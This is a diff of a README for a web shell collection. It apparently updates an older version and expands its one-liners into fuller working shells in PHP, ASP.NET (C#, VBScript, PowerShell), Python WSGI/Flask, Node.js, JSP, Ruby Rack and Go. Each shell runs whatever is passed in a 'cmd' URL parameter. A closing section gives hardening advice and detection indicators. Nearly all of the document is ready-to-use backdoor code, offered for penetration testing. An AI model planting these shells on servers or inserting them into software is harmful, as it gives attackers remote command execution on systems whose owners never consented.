@@ -1,209 +1,284 @@
+# Web Shells Research Collection .. (updated, but absolutely still terrible) 
 
-# WebShells Repository
+A curated collection of web shell examples across multiple languages and platforms for security research and authorized penetration testing.
 
-This document collects a variety of one‑liner web shells across multiple languages and platforms, from classic PHP to modern frameworks. 
- ## Use responsibly for authorized testing only.
-## Lol.
+> ⚠️ **DISCLAIMER**: These examples are provided for educational and authorized security testing purposes only. Use responsibly and only on systems you own or have explicit permission to test.
 
----
+## Table of Contents
 
-## PHP Webshells
+- [PHP Web Shells](#php-web-shells)
+- [ASP.NET/ASPX](#aspnetaspx)
+- [Python (WSGI/Flask)](#python-wsgif lask)
+- [Node.js](#nodejs)
+- [Java/JSP](#javajsp)
+- [Ruby (Rack)](#ruby-rack)
+- [Go](#go)
+- [PowerShell/ASP.NET](#powershellaspnet)
+- [Security Notes](#security-notes)
 
-**Execute one command**
+## PHP Web Shells
 
-```php
-<?php system("whoami"); ?>
-```
-
-**Take input from URL parameter**
-
+### Basic Command Execution
 ```php
 <?php system($_GET['cmd']); ?>
 ```
 
-**Using `passthru`**
-
+### Alternative Execution Methods
 ```php
+// Using passthru
 <?php passthru($_GET['cmd']); ?>
+
+// Using shell_exec
+<?php echo shell_exec($_GET['cmd']); ?>
+
+// Using exec() with array output
+<?php exec($_GET['cmd'], $output); print_r($output); ?>
+
+// Using backticks
+<?php echo `{$_GET['cmd']}`; ?>
 ```
 
-**Using `shell_exec` (echo required)**
-
+### Legacy Eval-based (PHP < 7.0)
 ```php
-<?php echo shell_exec("whoami"); ?>
+// Note: preg_replace /e modifier removed in PHP 7.0+
+<?php preg_replace('/.*/e', 'system($_GET["cmd"]);', ''); ?>
 ```
 
-**Using `exec()` to capture all lines**
+## ASP.NET/ASPX
 
-```php
-<?php exec("ls -la", $out); print_r($out); ?>
-```
-
-**Using `preg_replace()` eval trick**
-
-```php
-<?php preg_replace('/.*/e', 'system("whoami");', ''); ?>
-```
-
-**Using backticks**
-
-```php
-<?php echo `<span style="color:blue;">whoami</span>`; ?>
-```
-
-> **GUI Shell**: [Sweetuu](https://github.com/cspshivam/sweetuu)
-
----
-
-## ASPX Webshell
-
-**Execute Windows command:**
-
-```asp
+### Basic Windows Command Shell
+```aspx
+<%@ Page Language="C#" %>
 <%
-  Set sh = CreateObject("WScript.Shell")
-  Set ex = sh.Exec("cmd /c whoami")
-  Response.Write(ex.StdOut.ReadAll())
+    string cmd = Request.QueryString["cmd"];
+    var psi = new System.Diagnostics.ProcessStartInfo("cmd.exe", "/c " + cmd);
+    psi.RedirectStandardOutput = true;
+    psi.UseShellExecute = false;
+    psi.CreateNoWindow = true;
+    var process = System.Diagnostics.Process.Start(psi);
+    Response.Write("<pre>" + process.StandardOutput.ReadToEnd() + "</pre>");
 %>
 ```
 
-> Can be bound via `web.config` to intercept requests.
-
----
-
-## Python Webshells (WSGI)
-
-**Minimal WSGI shell** (`shell.py`)
-
-```python
-def application(environ, start_response):
-    cmd = environ.get('QUERY_STRING', '')
-    output = __import__('subprocess').check_output(cmd.split())
-    start_response('200 OK', [('Content-Type','text/plain')])
-    return [output]
+### VBScript Version
+```aspx
+<%
+    Set sh = CreateObject("WScript.Shell")
+    Set ex = sh.Exec("cmd /c " & Request.QueryString("cmd"))
+    Response.Write("<pre>" & ex.StdOut.ReadAll() & "</pre>")
+%>
 ```
 
-**Flask single endpoint**
+## Python (WSGI/Flask)
 
+### Minimal WSGI Application
+```python
+# wsgi_shell.py
+import subprocess
+from urllib.parse import parse_qs
+
+def application(environ, start_response):
+    query = environ.get('QUERY_STRING', '')
+    params = parse_qs(query)
+    cmd = params.get('cmd', [''])[0]
+    
+    try:
+        output = subprocess.check_output(cmd, shell=True, text=True)
+    except Exception as e:
+        output = str(e)
+    
+    start_response('200 OK', [('Content-Type', 'text/plain')])
+    return [output.encode()]
+```
+
+### Flask Implementation
 ```python
 from flask import Flask, request
 import subprocess
+
 app = Flask(__name__)
 
 @app.route('/shell')
 def shell():
     cmd = request.args.get('cmd', '')
-    return subprocess.getoutput(cmd)
+    try:
+        return subprocess.getoutput(cmd)
+    except Exception as e:
+        return f"Error: {e}"
 
-# run with: python shell.py
+if __name__ == '__main__':
+    app.run(debug=True, port=5000)
 ```
 
----
+## Node.js
 
-## Node.js Webshells
+### Express Server
+```javascript
+const express = require('express');
+const { execSync } = require('child_process');
 
-**Express one-liner**
+const app = express();
 
-```js
-require('express')().get('/shell',(req,res)=>res.send(require('child_process').execSync(req.query.cmd)) ).listen(3000)
+app.get('/shell', (req, res) => {
+    try {
+        const output = execSync(req.query.cmd, { encoding: 'utf8' });
+        res.type('text/plain').send(output);
+    } catch (error) {
+        res.status(500).send(error.message);
+    }
+});
+
+app.listen(3000, () => console.log('Server running on port 3000'));
 ```
 
-**Standalone HTTP**
-
-```js
+### Standalone HTTP Server
+```javascript
 const http = require('http');
 const { exec } = require('child_process');
-http.createServer((req,res)=>{
-  let cmd = new URL(req.url, 'http://x').searchParams.get('cmd');
-  exec(cmd, (e,o) => res.end(o));
+const { URL } = require('url');
+
+http.createServer((req, res) => {
+    const url = new URL(req.url, `http://${req.headers.host}`);
+    const cmd = url.searchParams.get('cmd');
+    
+    exec(cmd, (error, stdout, stderr) => {
+        res.writeHead(200, { 'Content-Type': 'text/plain' });
+        res.end(stdout || stderr || error?.message);
+    });
 }).listen(8080);
 ```
 
----
+## Java/JSP
 
-## Java/JSP Webshells
-
-**JSP eval shell**
-
+### JSP Command Execution
 ```jsp
-<%@ page import="java.io.*" %>
+<%@ page import="java.io.*,java.util.*" %>
 <%
-  String cmd = request.getParameter("cmd");
-  Process p = Runtime.getRuntime().exec(cmd);
-  InputStream in = p.getInputStream();
-  int a;
-  while((a=in.read())!=-1) out.print((char)a);
+    String cmd = request.getParameter("cmd");
+    if (cmd != null) {
+        try {
+            Process p = Runtime.getRuntime().exec(cmd);
+            BufferedReader reader = new BufferedReader(new InputStreamReader(p.getInputStream()));
+            String line;
+            while ((line = reader.readLine()) != null) {
+                out.println(line + "<br>");
+            }
+        } catch (Exception e) {
+            out.println("Error: " + e.getMessage());
+        }
+    }
 %>
 ```
 
-**EL injection** (if enabled)
-
+### Expression Language Injection (when enabled)
 ```jsp
-${"".getClass().forName("java.lang.Runtime").getRuntime().exec(param.cmd)}
+${pageContext.request.getParameter("cmd")}
+<!-- Note: EL injection requires specific server configurations -->
 ```
 
----
+## Ruby (Rack)
 
-## Ruby Webshell (Rack)
-
-**Minimal Rack shell**
-
+### Rack Application
 ```ruby
 # config.ru
-run lambda {|env|
-  cmd = Rack::Request.new(env).params['cmd']
-  out = `#{cmd}`
-  [200, {'Content-Type'=>'text/plain'}, [out]]
-}
+require 'rack'
+
+app = lambda do |env|
+  request = Rack::Request.new(env)
+  cmd = request.params['cmd']
+  
+  begin
+    output = `#{cmd} 2>&1`
+    [200, {'Content-Type' => 'text/plain'}, [output]]
+  rescue => e
+    [500, {'Content-Type' => 'text/plain'}, [e.message]]
+  end
+end
+
+run app
 ```
 
----
+## Go
 
-## Golang Webshell
-
-**Single-file HTTP shell**
-
+### HTTP Server with Command Execution
 ```go
 package main
-import(
-  "net/http"; "os/exec"
+
+import (
+    "net/http"
+    "os/exec"
+    "log"
 )
-func main(){
-  http.HandleFunc("/", func(w,http.ResponseWriter,r){
+
+func shellHandler(w http.ResponseWriter, r *http.Request) {
     cmd := r.URL.Query().Get("cmd")
-    out,_:= exec.Command("sh","-c",cmd).Output()
-    w.Write(out)
-  })
-  http.ListenAndServe(":8080",nil)
+    if cmd == "" {
+        http.Error(w, "No command provided", 400)
+        return
+    }
+    
+    output, err := exec.Command("sh", "-c", cmd).Output()
+    if err != nil {
+        http.Error(w, err.Error(), 500)
+        return
+    }
+    
+    w.Header().Set("Content-Type", "text/plain")
+    w.Write(output)
+}
+
+func main() {
+    http.HandleFunc("/shell", shellHandler)
+    log.Println("Server starting on :8080")
+    log.Fatal(http.ListenAndServe(":8080", nil))
 }
 ```
 
----
+## PowerShell/ASP.NET
 
-## PowerShell Webshell (IIS)
-
-**ASPX with PowerShell**
-
-```asp
+### PowerShell Command Execution
+```aspx
 <%@ Page Language="C#" %>
 <%
-  var cmd = Request.QueryString["cmd"];
-  var psi = new System.Diagnostics.ProcessStartInfo("powershell.exe", cmd);
-  psi.RedirectStandardOutput = true;
-  psi.UseShellExecute = false;
-  var p = System.Diagnostics.Process.Start(psi);
-  Response.Write(p.StandardOutput.ReadToEnd());
+    string cmd = Request.QueryString["cmd"];
+    if (!string.IsNullOrEmpty(cmd)) {
+        var psi = new System.Diagnostics.ProcessStartInfo("powershell.exe", "-Command " + cmd);
+        psi.RedirectStandardOutput = true;
+        psi.UseShellExecute = false;
+        psi.CreateNoWindow = true;
+        
+        var process = System.Diagnostics.Process.Start(psi);
+        string output = process.StandardOutput.ReadToEnd();
+        process.WaitForExit();
+        
+        Response.Write("<pre>" + Server.HtmlEncode(output) + "</pre>");
+    }
 %>
 ```
 
+## Security Notes
+
+### For Researchers
+- **Always obtain proper authorization** before testing web shells
+- Use these examples in isolated, controlled environments
+- Document findings responsibly
+- Follow coordinated disclosure practices
+
+### For Developers
+- **Input Validation**: Never trust user input - validate and sanitize all parameters
+- **Least Privilege**: Run web applications under restricted accounts
+- **Disable Dangerous Functions**: Remove or disable `system()`, `exec()`, `shell_exec()`, etc. in production
+- **Web Application Firewalls**: Implement WAF rules to detect command injection attempts
+- **Code Review**: Regularly audit code for command injection vulnerabilities
+- **Content Security Policy**: Implement strict CSP headers to limit execution contexts
+
+### Detection Indicators
+- URL parameters like `cmd`, `command`, `exec`
+- HTTP requests with shell metacharacters (`|`, `&`, `;`, etc.)
+- Unusual process spawning from web server processes
+- Network connections from web server to unexpected destinations
+
 ---
 
-## Notes & Best Practices
-
-* **Sanitize inputs**: these examples are intentionally insecure. Always validate and sanitize user-supplied commands in real applications.
-* **Least privilege**: run web servers under unprivileged accounts.
-* **Use proper access controls**: disallow direct execution functions like `system` or `exec` where possible.
-
----
-
+**Repository maintained for educational and authorized security testing purposes only, lol**
 
